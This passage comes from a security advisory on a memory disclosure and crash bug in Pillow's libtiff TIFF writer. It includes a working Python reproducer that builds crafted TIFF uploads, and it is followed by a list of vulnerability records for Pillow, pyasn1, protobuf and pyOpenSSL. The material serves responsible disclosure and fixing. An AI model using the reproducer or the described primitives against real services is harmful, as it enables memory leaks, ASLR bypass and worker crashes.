    `TiffTags.lookup`, the pointer-only convention happens to match, but
    libtiff copies its *fixed* count from an array that is only as long as the
    file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a
    bare `im.save(out, "TIFF")` gives `READ of size 24 … right of 4-byte
    region`, and the over-read floats are written to tag 319 of the output.
    `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at
    `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.
* **Core tag reached as a scalar via a stale file-supplied type.** With the
  re-save idiom `im.save(out, "TIFF", tiffinfo=im.tag_v2)`, `_save` copies
  `ifd.tagtype[key] = info.tagtype[key]` for every key
  (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of
  the same tags without resetting the type (`ifd[COLORMAP] = colormap` at
  `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,
  ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry
  is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry
  palette to a single `int` (with only a "too many entries" warning), the
  encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and
  `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —
  libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every
  run. The stale-tagtype copy is a Python-side hygiene bug in its own right,
  but its memory-safety consequence exists only because the encoder lets a
  non-tuple value reach `TIFFSetField(COLORMAP)`.

## Impact

Any service that accepts a TIFF and writes it back out as TIFF through libtiff —
which happens with a plain `im.save(fp, "TIFF")` whenever the uploaded file is
compressed, or whenever a `compression=` other than raw is requested — returns
to the uploader, inside one metadata tag of the produced file, an
attacker-chosen number of bytes read from a stale pointer in the worker process,
deterministically and without retries. Which memory that is depends on the
compiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang
build the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes
(which succeeded every time in testing, as did 2 000 000) covers the
extension's `.rodata`, `.data.rel.ro`/GOT and `.data` and returned 2 800+
resolved pointers into libpython, libc, libtiff, libjpeg and others — a complete
ASLR bypass for chaining with any other memory bug; a gcc build of the same
source left a different, unrelated address in that slot. The fixed-count
variant kills the worker process with SIGSEGV from a 181-byte upload on every
request. With `tiffinfo=im.tag_v2` the source
address is fully attacker-chosen (16-byte arbitrary read into the output for
ActiveArea, or a crash). No non-default Pillow setting is involved; the only
precondition is TIFF-to-TIFF re-encoding.

The other branches add further deterministic process-kill inputs (BYTE-typed
ColorMap in any RGB or palette TIFF; `thumbnail()` keeps `tag_v2`, so
open→thumbnail→save-as-TIFF is affected too) and extend the reach to
JPEG/PNG/WebP uploads whose EXIF is preserved with `exif=` when converting to
libtiff-compressed TIFF. All the memory errors are reads; libtiff sizes its
destination buffers with the same count it copies, so no out-of-bounds write
was found.

## Reproducing

`repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.

`upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `<tag> / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, "TIFF")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole "application": `Image.open(BytesIO(src)); im.save(out, "TIFF")`.

The script runs three cases:

1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.
2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.
3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.

Expected output on the affected tree:

```
control  tag 65000=4096 -> 4096
leak     tag 50740=65536 from a 356-byte upload -> 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff
         leaked bytes found in _imaging.so at file offset 0x57588
crash    tag 50829=64 -> child exit -11 (SIGSEGV)
BUG
```

The script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).

The other branches can be checked by hand on the stock build in the same way
(each as `Image.open(f); im.save(BytesIO(), "TIFF")` in a child process):
a PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / "ABCD"` →
SIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`
saved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG
whose EXIF holds tag 50000 = RATIONAL×2 saved with
`compression="tiff_lzw", exif=im.info["exif"]` → SIGSEGV in most runs,
`RuntimeError` ("Failed to allocate memory for custom tag binary object
(-N elements of 4 bytes each)") in the rest.

## Suggested fix

The encoder must not guess the calling convention; it has to ask libtiff what
the tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and
marshal accordingly, or refuse. The attached patch does this for non-core tags:

* a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared
  in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's
  `TIFFFindField` type, `passcount` and `writecount` for a tag;
* in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that
  libtiff already knows, Pillow adopts libtiff's type when it has none of its
  own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`
  checks the value against libtiff's definition: a scalar only for a
  single-value field whose C argument type (int / `uint64_t` / double /
  `char *`) matches, an array only with libtiff's element size and, for
  fixed-count fields, exactly `writecount` elements. Anything else raises
  `ValueError("Tag value does not match libtiff field definition")` instead of
  reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and
  ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the
  `LONG8` `tiffinfo=` variant;
* every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which
  passes `len` only when the field has `passcount` set; this also fixes the
  `TIFF_RATIONAL` branch, which never passed a count (and extends it to
  `TIFF_SRATIONAL`);
* `TIFF_UNDEFINED` fields are registered as variable-length, matching how their
  `bytes` values are passed;
* `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,
  scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).

Core tags and tags libtiff does not know keep their current behaviour. With the
patch applied to a clean checkout and rebuilt, the reproducer no longer
triggers and the test suite passes. It is not a complete fix, however: the
whole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant
stays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a
bare `save()`, no longer segfaults at this point but writes 1536 bytes —
over-read from the 5-byte `bytes` object and two stale varargs, including 22
live heap pointers — into the output ColorMap, which is still a disclosure.
Before merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through
the existing 768-tuple branch, never through the scalar or `bytes` branches,
and ideally the same shape check for the other core tags libtiff special-cases
in `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,
ReferenceBlackWhite 532).

Narrower Python-side mitigations in `_save` close individual entry points but
not the class, and are worth adding alongside the C-side check: drop tags
with `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not
`tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to
`EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type
guard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to
`REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before
assigning its own ColorMap/BitsPerSample/ICCProfile/… values so a
`tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to
rely on.

<details>
<summary>Reproducer — <code>repro</code>, 2,545 bytes (click to open)</summary>

Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.

```python
#!/usr/bin/env python3
# Pillow libtiff writer: a count-1 integer tag copied from the source TIFF is passed to
# TIFFSetField() as one scalar vararg; for tags libtiff itself defines as arrays it is
# consumed as a byte COUNT (DNGPrivateData 50740 -> N bytes of process memory written
# into the output) or as a POINTER (ActiveArea 50829 -> SIGSEGV).  Application side is
# the ordinary "open upload, save as TIFF" (compression is inherited -> libtiff writer).
import io, struct, subprocess, sys, resource
from PIL import Image

def upload(tag, value):
    """Pillow-written 16x16 LZW TIFF, plus one extra IFD entry <tag> LONG[1] = value."""
    b = io.BytesIO()
    Image.new("RGB", (16, 16), "red").save(b, "TIFF", compression="tiff_lzw")
    data = bytearray(b.getvalue()); assert data[:4] == b"II*\0"
    (off,) = struct.unpack_from("<I", data, 4)
    (n,) = struct.unpack_from("<H", data, off)
    ents = [bytes(data[off + 2 + 12 * i: off + 14 + 12 * i]) for i in range(n)]
    ents.append(struct.pack("<HHII", tag, 4, 1, value))
    ents.sort(key=lambda e: struct.unpack_from("<H", e)[0])
    data += b"\0" * (len(data) & 1); new_off = len(data)
    data += struct.pack("<H", len(ents)) + b"".join(ents) + struct.pack("<I", 0)
    struct.pack_into("<I", data, 4, new_off)
    return bytes(data)

def resave(src):                       # the whole "service"
    im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, "TIFF")
    return out.getvalue()

if len(sys.argv) > 1 and sys.argv[1] == "child":
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    resave(upload(50829, 64)); sys.exit(0)

print("PIL core:", Image.core.__file__)
ctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)
print("control  tag 65000=4096 ->", repr(ctl))

N = 65536
src = upload(50740, N)
try:
    v = Image.open(io.BytesIO(resave(src))).tag_v2.get(50740)
except (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag
    v = e
leak = isinstance(v, bytes) and len(v) == N and v[:64] not in src
print(f"leak     tag 50740={N} from a {len(src)}-byte upload ->",
      f"{len(v)} bytes not present in input, head {v[:32].hex()}" if leak else repr(v)[:80])
if leak:
    so = open(Image.core.__file__, "rb").read()
    print("         leaked bytes found in _imaging.so at file offset", hex(so.find(v[:256])))

rc = subprocess.call([sys.executable, __file__, "child"])
crash = rc in (-11, 139)
print("crash    tag 50829=64 -> child exit", rc, "(SIGSEGV)" if crash else "")
print("BUG" if leak or crash else "OK")
```

vulnerabilities.Title: Pillow: Pillow: Denial of Service via decompression bomb in FITS image processing
vulnerabilities.Description: Pillow is a Python imaging library. Versions 10.3.0 through 12.1.1 did not limit the amount of GZIP-compressed data read when decoding a FITS image, making them vulnerable to decompression bomb attacks. A specially crafted FITS file could cause unbounded memory consumption, leading to denial of service (OOM crash or severe performance degradation). If users are unable to immediately upgrade, they should only open specific image formats, excluding FITS, as a workaround.

vulnerabilities.Title: Pillow: python-pillow: Pillow: Arbitrary code execution via malicious PSD file processing
vulnerabilities.Description: Pillow is a Python imaging library. From version 10.3.0 to before version 12.2.0, processing a malicious PSD file could lead to memory corruption, potentially resulting in a crash or arbitrary code execution. This issue has been patched in version 12.2.0.

vulnerabilities.Title: Pillow: Pillow: Memory disclosure or denial of service via crafted McIdas AREA image
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, when Pillow loads an uncompressed McIdas AREA image from a filename through the mmap raw codec path, attacker-controlled header words can set a row stride smaller than the natural row width, causing pixel access such as Image.tobytes(), getpixel, convert, or save to read beyond the mapped region and disclose adjacent process memory or fault. This issue is fixed in version 12.3.0.

vulnerabilities.Title: python-pillow: Pillow: Denial of Service via crafted PCF font data
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, PIL/PcfFontFile.py _load_bitmaps() read glyph dimensions from the PCF METRICS section and passed them directly to Image.frombytes() without calling Image._decompression_bomb_check(), allowing crafted PCF font data to cause excessive memory allocation. This issue is fixed in version 12.3.0.

vulnerabilities.Title: python-pillow: Pillow: Denial of Service via excessive memory allocation when processing font files
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, PIL/FontFile.py FontFile.compile() assembled per-glyph images into a combined bitmap with Image.new("1", (xsize, ysize)) without calling Image._decompression_bomb_check(), allowing a font to trigger excessive allocation during conversion or saving. This issue is fixed in version 12.3.0.

vulnerabilities.Title: python-pillow: Pillow: Denial of Service via crafted BDF font file
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, PIL/BdfFontFile.py bdf_char() read the BBX width and height field from a BDF font file and passed attacker-controlled dimensions to Image.new() without calling Image._decompression_bomb_check(), bypassing Pillow's documented decompression bomb protection and allowing excessive memory allocation. This issue is fixed in version 12.3.0.

vulnerabilities.Title: python-pillow: Pillow: Denial of Service via crafted GD 2.x image file
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, PIL/GdImageFile.py GdImageFile._open() read image dimensions from the GD 2.x header and stored them in self._size without calling Image._decompression_bomb_check(), allowing a crafted .gd file to trigger excessive C-heap allocation when loaded. This issue is fixed in version 12.3.0.

vulnerabilities.Title: Pillow: Pillow: Native heap out-of-bounds write
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, Pillow's public rank-filter API can trigger a native heap out-of-bounds write when given a very large odd filter size because ImageFilter.RankFilter.filter() calls image.expand(size // 2, size // 2) before rank-filter size validation and ImagingExpand() computes output dimensions with unchecked signed int arithmetic. This issue is fixed in version 12.3.0.

vulnerabilities.Title: Pillow: Pillow: Denial of Service via out-of-bounds write in image processing
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, Pillow public image coordinate APIs can trigger a native heap out-of-bounds write when given coordinates near the signed 32-bit integer limits in Image.paste(), Image.crop(), or Image.alpha_composite(). This issue is fixed in version 12.3.0.

vulnerabilities.Title: Pillow: Pillow: Denial of service via crafted PDF stream
vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 12.3.0, PdfParser.PdfStream.decode() in PIL/PdfParser.py calls zlib.decompress() with bufsize set to the PDF stream Length field without bounding the decompressed output size, allowing a crafted FlateDecode PDF stream to exhaust memory from a small file. This issue is fixed in version 12.3.0.

vulnerabilities.Title: Pillow: Pillow: Denial of Service via crafted JPEG2000 image
vulnerabilities.Description: Pillow is a Python imaging library. From 8.2.0 through 12.2.0, src/libImaging/Jpeg2KDecode.c accumulates total_component_width across every tile in a JPEG2000 image instead of recomputing it per tile, allowing a crafted tiled JPEG2000 file to force substantially higher transient memory usage and trigger out-of-memory failures during decoding. This issue is fixed in version 12.3.0.

vulnerabilities.Title: Pillow: Pillow: Controlled native heap corruption in ImageCms.ImageCmsTransform.apply API
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 12.3.0, Pillow's ImageCms.ImageCmsTransform.apply(im, imOut) API can trigger controlled native heap corruption when the caller supplies an output image whose mode does not match the transform's declared output mode. This issue is fixed in version 12.3.0.

vulnerabilities.Title: pillow: pillow: Denial of Service via decompression bomb bypass in SPIDER images
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, SpiderImageFile.seek() in src/PIL/SpiderImagePlugin.py reparses a later SPIDER stack frame and replaces self._size without rerunning Image._decompression_bomb_check(). A tiny file can use a safe first frame to pass Image.open() and then declare very large dimensions in a later mode F frame. Loading that frame allocates approximately four bytes per attacker-declared pixel and can consume multiple gigabytes of memory. This issue is fixed in version 13.0.0.

vulnerabilities.Title: pillow: pillow: Denial of Service via duplicate page references in PDF files
vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, PdfParser.linearize_page_tree() in src/PIL/PdfParser.py treats a PDF /Pages graph as a tree without tracking duplicate indirect references. When Image.save(..., format="PDF", append=True) processes an attacker-controlled existing PDF whose /Kids arrays repeatedly reference the same child /Pages node, Pillow expands the shared subtree as distinct pages. A compact malformed PDF can therefore create exponentially many page references and consume disproportionate CPU before the append completes. This issue is fixed in version 13.0.0.

vulnerabilities.Title: pillow: Pillow: Denial of Service via negative archive member size in TarIO
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, the TarIO initializer in src/PIL/TarIO.py accepts a negative octal member size and computes a backward seek that returns to the same 512-byte header. When the requested member name does not match, the parser repeatedly reads that header, consumes a full CPU core, and never returns. TarIO is reached only when an application directly uses PIL.TarIO.TarIO rather than the default Image.open() path. This issue is fixed in version 13.0.0.

vulnerabilities.Title: pillow: pillow: Denial of Service via repeated EXIF headers
vulnerabilities.Description: Pillow is a Python imaging library. From 11.0.0 until 13.0.0, Exif.load() in src/PIL/Image.py repeatedly slices the remaining EXIF data while it begins with the six-byte Exif header. src/PIL/PngImagePlugin.py accepts an uncapped PNG eXIf chunk, so a file filled with repeated headers causes a new shrinking copy on every iteration and quadratic CPU work. The condition is reachable through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(), including common photo-upload rotation workflows. This issue is fixed in version 13.0.0.

vulnerabilities.Title: pillow: Pillow: Denial of Service via out-of-bounds read in metafile parser
vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0 on Windows, src/PIL/WmfImagePlugin.py passes unchecked 32-bit WMF or EMF dimensions to the native drawwmf handler in src/display.c. The handler sizes a DIB allocation from 16-bit-truncated bcWidth and bcHeight fields but copies pixel data using the original full dimensions. A crafted wide, short metafile can pass the pixel-count decompression-bomb check and make the Windows-only renderer read beyond the heap buffer, potentially disclosing memory or crashing the process. This issue is fixed in version 13.0.0.

vulnerabilities.Title: pillow: pillow: Arbitrary code execution via JPEG encoder buffer overflow
vulnerabilities.Description: Pillow is a Python imaging library. From 9.4.0 until 13.0.0, ImagingJpegEncode() in src/libImaging/JpegEncode.c can call jpeg_write_marker() for a JPEG COM comment when an ICC profile has exactly filled the 65536-byte encoder buffer. libjpeg writes one byte before checking the exhausted free_in_buffer counter, which then wraps and permits the attacker-controlled comment and subsequent compressed image data to overwrite adjacent heap memory. Re-saving an untrusted image as JPEG while preserving its ICC profile and forwarded comment can crash the process and may enable code execution in suitable runtime and heap layouts. This issue is fixed in version 13.0.0.

vulnerabilities.Title: Pillow: Bundled libopenjp2 2.5.4 in all wheels since 11.1.0 carries OSV-2025-219 heap-buffer-overflow write reachable from Image.open().load()
vulnerabilities.Description:
### Summary

Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219

Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.

I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.

Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.

### Details

## Affected wheels

From `.github/dependencies.json` (`openjpeg`) at each tag:

| Pillow | bundled OpenJPEG | status |
|---|---|---|
| 10.4.0 | 2.5.2 | safe |
| 11.0.0 | 2.5.2 | safe |
| **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** |
| **12.0.0 … 12.3.0** | **2.5.4** | **affected** |

Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.

## The defect

`src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:

```c
OPJ_UINT32 l_current_tile_part =
    l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =
    l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2;
```

`tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.

The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.

Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.

## Patch status

Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).

The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.

## Suggested remediation

1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file.
2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code.
3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.

## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply

`Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.

I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.

That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.

### Proof of concept

ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:

```
==766332==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
    #0 opj_j2k_read_sod          j2k.c:5086
    #1 opj_j2k_read_tile_header  j2k.c:9912
    #2 opj_read_tile_header      openjpeg.c:575
    #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793
    #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949
    #5 _decode                   src/decode.c:132
located 8 bytes to the right of a 24-byte region allocated by
    opj_j2k_build_tp_index_from_tlm j2k.c:8939
```

Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.

I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.

No disclosure deadline from me; I will not publish anything while this is being worked on.

### Impact

Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.

**Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.

**Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):

```
rip  0x4000    <- value chosen by the attacker's file layout
rsi  0x3ff2    <- m_error_data, written by the same walk
```

Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.

To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

vulnerabilities.Title: python-protobuf: Unbounded recursion in Python Protobuf
vulnerabilities.Description: Any project that uses Protobuf Pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of recursive groups, recursive messages or a series of SGROUP tags can be corrupted by exceeding the Python recursion limit. This can result in a Denial of service by crashing the application with a RecursionError. We recommend upgrading to version =>6.31.1 or beyond commit 17838beda2943d08b8a9d4df5b68f5f04f26d901

vulnerabilities.Title: python: protobuf: Protobuf: Denial of Service due to recursion depth bypass
vulnerabilities.Description:
A denial-of-service (DoS) vulnerability exists in google.protobuf.json_format.ParseDict() in Python, where the max_recursion_depth limit can be bypassed when parsing nested google.protobuf.Any messages.

Due to missing recursion depth accounting inside the internal Any-handling logic, an attacker can supply deeply nested Any structures that bypass the intended recursion limit, eventually exhausting Python’s recursion stack and causing a RecursionError.

vulnerabilities.Title: pyOpenSSL: DTLS cookie callback buffer overflow
vulnerabilities.Description: pyOpenSSL is a Python wrapper around the OpenSSL library. Starting in version 22.0.0 and prior to version 26.0.0, if a user provided callback to `set_cookie_generate_callback` returned a cookie value greater than 256 bytes, pyOpenSSL would overflow an OpenSSL provided buffer. Starting in version 26.0.0, cookie values that are too long are now rejected.

vulnerabilities.Title: pyasn1: pyasn1: Denial of Service via hash collisions in schemaless decoding
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. From 0.3.3 until 0.6.5, schemaless container decoding stores every decoded component's TagSet in a growing set even though only one-versus-multiple tag types must be distinguished. Attacker-controlled BER, CER, or DER input contains many distinct long tag IDs whose TagSet hashes collide. Each later set insertion compares against an increasing number of earlier colliding tags in ConstructedPayloadDecoderBase._decodeComponentsSchemaless, producing quadratic CPU work while decoded values and order remain valid. Repeated inputs can exhaust decoder CPU and reduce service availability. This issue is fixed in version 0.6.5.

vulnerabilities.Title: pyasn1: pyasn1: Denial of Service via quadratic processing of fragmented ASN.1 data
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed string and indefinite-length ANY decoding repeatedly concatenates each fragment onto a growing bytes value. Attacker-controlled BER or CER data can use many constructed OCTET STRING or character-string fragments. DER rejects constructed OCTET STRING without a schema, but accepts its definite-length form when asn1Spec selects univ.OctetString; it also accepts constructed character strings such as UTF8String without a schema, even though those encodings are not valid DER. The separate indefinite-length ANY path is reachable in BER and CER when asn1Spec selects univ.Any; DER rejects indefinite lengths. OctetStringPayloadDecoder uses growing header concatenation and AnyPayloadDecoder.indefLenValueDecoder uses growing chunk concatenation, repeatedly copying an increasing prefix and causing quadratic work. A sufficiently fragmented value can occupy decoding workers and cause CPU exhaustion without confidentiality or integrity impact. This issue is fixed in version 0.6.5.

vulnerabilities.Title: pyasn1: pyasn1: Denial of Service via constructed bit string decoding
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed BIT STRING decoding repeatedly shifts and copies the complete bit value accumulated from earlier fragments. Attacker-controlled BER or CER input contains many constructed BIT STRING fragments; schema-driven DER also accepts a definite-length constructed BIT STRING. BitStringPayloadDecoder repeatedly calls BitString.fromOctetString with the prior bitString as prepend, shifting an ever-growing SizedInteger for each fragment and causing quadratic work. Large fragmented values can exhaust CPU during decode() without requiring later conversion or formatting. This issue is fixed in version 0.6.5.

vulnerabilities.Title: pyasn1: pyasn1: Denial of Service via quadratic complexity in binary REAL decoding
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, binary REAL decoding builds a large mantissa one octet at a time by shifting a growing integer and slicing the remaining byte string. Attacker-controlled ASN.1 includes a binary-encoded REAL with a large mantissa and reaches BER, CER, or DER decode(), with or without a schema containing REAL. RealPayloadDecoder.valueDecoder repeatedly performs a left shift, OR, and suffix copy for every mantissa octet, making decode time quadratic in mantissa length. A comparatively small REAL value can hold a decoding worker on one CPU core for seconds or longer and cause availability loss. This issue is fixed in version 0.6.5.

vulnerabilities.Title: pyasn1: pyasn1 Vulnerable to Denial of Service via Unbounded Recursion
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.3, the `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing thousands of nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with "Indefinite Length" (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application. This is a distinct vulnerability from CVE-2026-23490 (which addressed integer overflows in OID decoding). The fix for CVE-2026-23490 (`MAX_OID_ARC_CONTINUATION_OCTETS`) does not mitigate this recursion issue. Version 0.6.3 fixes this specific issue.

vulnerabilities.Title: python-pyasn1: pyasn1: Denial of Service via crafted BER input
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER decoder shared by the CER and DER codecs parses long-form tags by accumulating continuation octets without an upper bound on the tag ID size, allowing a crafted input to force construction of an arbitrarily large integer with CPU cost growing quadratically and to trigger unhandled ValueError exceptions in Python 3.11+ error formatting paths. Any application decoding untrusted BER, CER, or DER input is affected. This issue is fixed in version 0.6.4.

vulnerabilities.Title: pyasn1: python-pyasn1: pyasn1: Denial of Service via crafted ASN.1 OBJECT IDENTIFIER
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER, CER, and DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs, so a small crafted payload containing an OID with many arcs consumes excessive CPU per decode() call and can deny service to applications that decode untrusted ASN.1 data. The corresponding encoders have the same quadratic behavior when an application re-encodes previously decoded attacker-supplied values. This issue is fixed in version 0.6.4.

